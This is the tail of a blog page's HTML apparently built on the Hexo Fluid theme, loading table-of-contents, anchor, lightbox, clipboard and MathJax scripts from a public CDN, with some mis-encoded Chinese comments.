      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  
      <script>
        if (!window.MathJax) {
          window.MathJax = {
            tex    : {
              inlineMath: { '[+]': [['$', '$']] }
            },
            loader : {
              load: ['ui/lazy']
            },
            options: {
              renderActions: {
                insertedScript: [200, () => {
                  document.querySelectorAll('mjx-container').forEach(node => {
                    let target = node.parentNode;
                    if (target.nodeName.toLowerCase() === 'li') {
                      target.parentNode.classList.add('has-jax');
                    }
                  });
                }, '', false]
              }
            }
          };
        } else {
          MathJax.startup.document.state(0);
          MathJax.texReset();
          MathJax.typeset();
          MathJax.typesetPromise();
        }
      </script>
    

  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>





<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ï¼Œå°†å®ƒä¿æŒåœ¨æœ€åº•éƒ¨ -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">åšå®¢åœ¨å…è®¸ JavaScript è¿è¡Œçš„ç¯å¢ƒä¸‹æµè§ˆæ•ˆæœæ›´ä½³</div>
  </noscript>
</body>
</html>
